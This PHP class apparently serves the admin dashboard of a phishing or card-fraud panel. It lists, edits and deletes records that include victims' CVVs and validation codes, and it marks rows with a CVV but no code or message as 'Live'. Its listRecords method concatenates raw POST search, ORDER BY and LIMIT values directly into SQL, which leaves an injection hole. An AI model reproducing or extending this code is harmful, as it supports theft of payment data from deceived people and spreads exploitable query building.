<?php
class Records {	
   
	private $recordsTable = 'user_info';
	public $id;
    public $name;
	public $phone;
    public $adress;
    public $state;
	public $message;
	
	private $conn;
	
	public function __construct($db){
        $this->conn = $db;
    }	    
	
	public function listRecords(){
		$sqlQuery = "SELECT * FROM ".$this->recordsTable." ";
		if(!empty($_POST["search"]["value"])){
			$sqlQuery .= 'where(id LIKE "%'.$_POST["search"]["value"].'%" ';
			$sqlQuery .= ' OR user_name LIKE "%'.$_POST["search"]["value"].'%" ';			
			$sqlQuery .= ' OR user_state LIKE "%'.$_POST["search"]["value"].'%" ';
			$sqlQuery .= ' OR user_message LIKE "%'.$_POST["search"]["value"].'%" ';
			$sqlQuery .= ' OR user_address LIKE "%'.$_POST["search"]["value"].'%") ';			
		}
		
		if(!empty($_POST["order"])){
			$sqlQuery .= 'ORDER BY '.$_POST['order']['0']['column'].' '.$_POST['order']['0']['dir'].' ';
		} else {
			$sqlQuery .= 'ORDER BY id DESC ';
		}
		
		if($_POST["length"] != -1){
			$sqlQuery .= 'LIMIT ' . $_POST['start'] . ', ' . $_POST['length'];
		}
		$stmt = $this->conn->prepare($sqlQuery);
		$stmt->execute();
		$result = $stmt->get_result();	
		
		$stmtTotal = $this->conn->prepare("SELECT * FROM ".$this->recordsTable);
		$stmtTotal->execute();
		$allResult = $stmtTotal->get_result();
		$allRecords = $allResult->num_rows;
		
		$displayRecords = $result->num_rows;
		$records = array();		
		while ($record = $result->fetch_assoc()) { 				
			$rows = array();			 
			$rows[] = $record['id'];
			$rows[] = ucfirst($record['user_name']);
			$rows[] = $record['user_phone'];		
			$rows[] = $record['user_address'];	
			
			if($record['user_cvv'] != "" && $record['user_validation_code'] == "" && $record['user_message'] == ""){
				$record['user_state'] = '<button type="button" name="update" id="'.$record["id"].'" class="btn btn-warning btn-xs update">Live</button>';
			}
			else
				$record['user_state'] = '<button type="button" name="update" id="'.$record["id"].'" class="btn btn-secondary  btn-xs update">Unlive</button>';
			$rows[] = $record['user_state'];
			$rows[] = $record['user_message'];

			$rows[] = '<button type="button" name="update" id="'.$record["id"].'" class="btn btn-primary btn-xs update">Edit/Send</button>';
			$rows[] = '<button type="button" name="delete" id="'.$record["id"].'" class="btn btn-danger btn-xs delete" >Delete</button>';
			$records[] = $rows;
		}
		
		$output = array(
			"draw"	=>	intval($_POST["draw"]),			
			"iTotalRecords"	=> 	$displayRecords,
			"iTotalDisplayRecords"	=>  $allRecords,
			"data"	=> 	$records
		);
		echo json_encode($output);
	}
	
	public function getRecord(){
		if($this->id) {
			$sqlQuery = "
				SELECT * FROM ".$this->recordsTable." 
				WHERE id = ?";			
			$stmt = $this->conn->prepare($sqlQuery);
			$stmt->bind_param("i", $this->id);	
			$stmt->execute();
			$result = $stmt->get_result();
			$record = $result->fetch_assoc();
			echo json_encode($record);
		}
	}
	public function updateRecord(){
		
		if($this->id) {			
			
			$stmt = $this->conn->prepare("
			UPDATE ".$this->recordsTable." 
			SET user_name= ?, user_phone = ?, user_address = ?, user_state = ?, user_message = ?
			WHERE id = ?");
	 
			$this->id = htmlspecialchars(strip_tags($this->id));
			$this->name = htmlspecialchars(strip_tags($this->name));
			$this->phone = htmlspecialchars(strip_tags($this->phone));
			$this->address = htmlspecialchars(strip_tags($this->address));
			$this->state = htmlspecialchars(strip_tags($this->state));
			$this->message = htmlspecialchars(strip_tags($this->message));
			
			
			$stmt->bind_param("sisssi", $this->name, $this->phone, $this->address, $this->state, $this->message, $this->id);
			
			if($stmt->execute()){
				return true;
			}
			
		}	
	}
	public function addRecord(){
		
		if($this->name) {

			$stmt = $this->conn->prepare("
			INSERT INTO ".$this->recordsTable."(`user_name`, `user_phone`, `user_address`, `user_state`, `user_message`)
			VALUES(?,?,?,?,?)");
		
			$this->name = htmlspecialchars(strip_tags($this->name));
			$this->phone = htmlspecialchars(strip_tags($this->phone));
			$this->address = htmlspecialchars(strip_tags($this->address));
			$this->state = htmlspecialchars(strip_tags($this->state));
			$this->message = htmlspecialchars(strip_tags($this->message));
			
			
			$stmt->bind_param("sisss", $this->name, $this->phone, $this->address, $this->state, $this->message);
			
			if($stmt->execute()){
				return true;
			}		
		}
	}
	public function deleteRecord(){
		if($this->id) {			

			$stmt = $this->conn->prepare("
				DELETE FROM ".$this->recordsTable." 
				WHERE id = ?");

			$this->id = htmlspecialchars(strip_tags($this->id));

			$stmt->bind_param("i", $this->id);

			if($stmt->execute()){
				return true;
			}
		}
	}
}
?>